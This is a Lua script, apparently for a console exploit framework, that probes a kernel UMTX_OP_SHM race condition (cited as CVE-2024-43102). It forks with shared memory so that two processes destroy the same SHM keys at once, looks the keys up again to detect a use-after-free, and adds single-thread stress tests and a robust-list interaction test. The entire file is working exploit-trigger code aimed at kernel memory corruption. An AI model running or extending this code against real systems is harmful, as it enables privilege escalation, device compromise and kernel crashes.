-- 14.10 Recon Probe 11: UMTX_OP_SHM race condition trigger
-- CVE-2024-43102 pattern: two processes racing SHM destroy
-- Strategy A: rfork(RFPROC|RFMEM) for shared-memory fork
-- Strategy B: single-thread SHM stress (fallback)

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: UMTX RACE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op   = 557,
    sc_rfork     = 251,
    sc_mmap      = 477,
    sc_munmap    = 73,
    sc_nanosleep = 240,
    sc_exit      = 1,
    sc_wait4     = 7,
    sc_close     = 6,
    sc_getpid    = 20,
    sc_shm_open2 = 532,
    sc_ftruncate = 480,
})

local UMTX_OP_SHM  = 25
local SHM_CREAT    = 1
local SHM_LOOKUP   = 2
local SHM_DESTROY  = 4
local SHM_ALIVE    = 8

local PROT_RW  = 3
local MAP_SHARED = 1
local MAP_ANON = 0x1000
local SYNC_SIZE = 4096

local do_strategy_b = true

-- mmap shared anonymous memory (survives rfork with RFMEM)
local sync_ok, sync_ret = pcall(function()
    return syscall.sc_mmap(0, SYNC_SIZE, PROT_RW, MAP_SHARED + MAP_ANON, -1, 0)
end)
local sync_addr = 0
if sync_ok then sync_addr = sync_ret:tonumber() end
log("sync region: " .. string.format("0x%x", sync_addr))

if sync_addr ~= 0 and sync_addr ~= 0xFFFFFFFFFFFFFFFF then
    -- Zero the sync region
    for i = 0, 127, 8 do
        memory.write_qword(sync_addr + i, 0)
    end

    -- Allocate umtx key addresses in shared mapping
    local NUM_ROUNDS = 50
    local KEYS_BASE = sync_addr + 256
    for i = 0, NUM_ROUNDS - 1 do
        memory.write_dword(KEYS_BASE + i * 16, 0xBEEF0000 + i)
    end

    log("")
    log("--- STRATEGY A: rfork race ---")

    local RFPROC = 16
    local RFMEM  = 32

    local rfork_ok, rfork_ret = pcall(function()
        return syscall.sc_rfork(RFPROC + RFMEM)
    end)

    if rfork_ok then
        local fork_rv = rfork_ret:tonumber()
        log("rfork returned: " .. fork_rv)

        if fork_rv > 0 then
            -- PARENT
            do_strategy_b = false
            local child_pid = fork_rv
            log("child pid: " .. child_pid)

            -- Wait briefly for child to start
            local ts_buf = memory.alloc(16)
            memory.write_qword(ts_buf, 0)
            memory.write_qword(ts_buf + 8, 50000000) -- 50ms
            pcall(function() syscall.sc_nanosleep(ts_buf, 0) end)

            local race_hits = 0
            local double_destroy_ok = 0
            local lookup_after_uaf = 0

            for round = 0, NUM_ROUNDS - 1 do
                local key_addr = KEYS_BASE + round * 16

                -- Create the SHM key
                pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0)
                end)

                -- Signal GO
                memory.write_dword(sync_addr, round + 1)

                -- RACE: parent destroys too
                local p_ok = pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
                end)
                if p_ok then double_destroy_ok = double_destroy_ok + 1 end

                -- Lookup on destroyed key
                pcall(function()
                    local r = syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
                    if r:tonumber() >= 0 then
                        lookup_after_uaf = lookup_after_uaf + 1
                    end
                end)

                race_hits = race_hits + 1
            end

            -- Signal done
            memory.write_dword(sync_addr, 0xFFFF)

            -- Reap child
            pcall(function()
                local status_buf = memory.alloc(4)
                syscall.sc_wait4(child_pid, status_buf, 0, 0)
            end)

            local child_rounds = memory.read_dword(sync_addr + 16):tonumber()

            log("")
            log("RACE RESULTS:")
            log("  rounds (parent): " .. race_hits)
            log("  rounds (child):  " .. child_rounds)
            log("  parent destroy OK: " .. double_destroy_ok)
            log("  lookup after double-free: " .. lookup_after_uaf)

            if lookup_after_uaf > 0 then
                log("  *** UAF INDICATOR: lookup OK on double-freed key ***")
            end

        elseif fork_rv == 0 then
            -- CHILD
            for round = 0, NUM_ROUNDS - 1 do
                local key_addr = KEYS_BASE + round * 16

                -- Wait for parent to signal this round
                local waited = 0
                while memory.read_dword(sync_addr):tonumber() < (round + 1) and waited < 500000 do
                    waited = waited + 1
                end
                if memory.read_dword(sync_addr):tonumber() == 0xFFFF then break end

                -- RACE: destroy same key
                pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
                end)

                -- Lookup on destroyed key
                pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
                end)

                local cc = memory.read_dword(sync_addr + 16):tonumber()
                memory.write_dword(sync_addr + 16, cc + 1)
            end

            pcall(function() syscall.sc_exit(0) end)
            return ""
        else
            log("rfork error code: " .. fork_rv)
        end
    else
        log("rfork FAILED: " .. tostring(rfork_ret):sub(1, 60))
    end
end

-- ============================================================
-- STRATEGY B: single-thread SHM stress
-- ============================================================
if do_strategy_b then
    log("")
    log("--- STRATEGY B: single-thread SHM stress ---")

    -- Test 1: create-destroy-create-lookup cycle
    local alias_hits = 0
    for i = 1, 200 do
        local key = memory.alloc(16)
        memory.write_dword(key, 0xAAAA0000 + i)
        pcall(function() syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        local lok = pcall(function()
            local r = syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
            if r:tonumber() >= 0 then alias_hits = alias_hits + 1 end
        end)
    end
    log("  create-destroy-create-lookup: " .. alias_hits .. "/200")

    -- Test 2: destroy with different value at same address
    local diff_val_hits = 0
    local test_key = memory.alloc(16)
    for i = 1, 100 do
        memory.write_dword(test_key, 0xBBBB0000 + i)
        pcall(function() syscall.sc_umtx_op(test_key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        memory.write_dword(test_key, 0xCCCC0000 + i)
        local dok = pcall(function()
            local r = syscall.sc_umtx_op(test_key, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
            if r:tonumber() >= 0 then diff_val_hits = diff_val_hits + 1 end
        end)
    end
    log("  destroy diff value same addr: " .. diff_val_hits .. "/100")

    -- Test 3: burst create then LIFO destroy
    local burst_keys = {}
    local burst_ok = 0
    for i = 1, 500 do
        local k = memory.alloc(16)
        memory.write_dword(k, 0xDD000000 + i)
        local ok = pcall(function()
            syscall.sc_umtx_op(k, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0)
        end)
        if ok then burst_ok = burst_ok + 1; burst_keys[#burst_keys + 1] = k end
    end
    local burst_destroy = 0
    for i = #burst_keys, 1, -1 do
        local ok = pcall(function()
            syscall.sc_umtx_op(burst_keys[i], UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
        end)
        if ok then burst_destroy = burst_destroy + 1 end
    end
    log("  burst create/LIFO destroy: " .. burst_ok .. "/" .. burst_destroy)

    -- Test 4: interleave two keys
    local interleave_ok = 0
    local k1 = memory.alloc(16)
    local k2 = memory.alloc(16)
    memory.write_dword(k1, 0xEE000001)
    memory.write_dword(k2, 0xEE000002)
    for i = 1, 300 do
        pcall(function() syscall.sc_umtx_op(k1, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(k2, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(k1, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
        local ok = pcall(function()
            local r = syscall.sc_umtx_op(k2, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
            if r:tonumber() >= 0 then interleave_ok = interleave_ok + 1 end
        end)
        pcall(function() syscall.sc_umtx_op(k2, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
    end
    log("  interleave k1/k2 lookup: " .. interleave_ok .. "/300")

    -- Test 5: robust list + SHM interaction
    log("")
    log("  robust+shm interaction...")
    local robust_params = memory.alloc(64)
    local shm_key = memory.alloc(64)
    memory.write_dword(shm_key, 0xFF000001)
    pcall(function() syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)

    memory.write_qword(robust_params, 24)
    memory.write_qword(robust_params + 8, shm_key)
    memory.write_qword(robust_params + 16, 0)
    local rob_ok = pcall(function()
        syscall.sc_umtx_op(robust_params, 26, 24, 0, 0, 0) -- UMTX_OP_ROBUST_LISTS=26
    end)
    log("  register robust -> SHM: " .. (rob_ok and "OK" or "FAIL"))

    pcall(function() syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
    log("  destroyed SHM under robust list")
    log("  still alive: pid=" .. syscall.getpid():tonumber())

    -- Deregister
    memory.write_qword(robust_params + 8, 0)
    pcall(function() syscall.sc_umtx_op(robust_params, 26, 24, 0, 0, 0) end)
end

log("")
log("=== UMTX RACE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
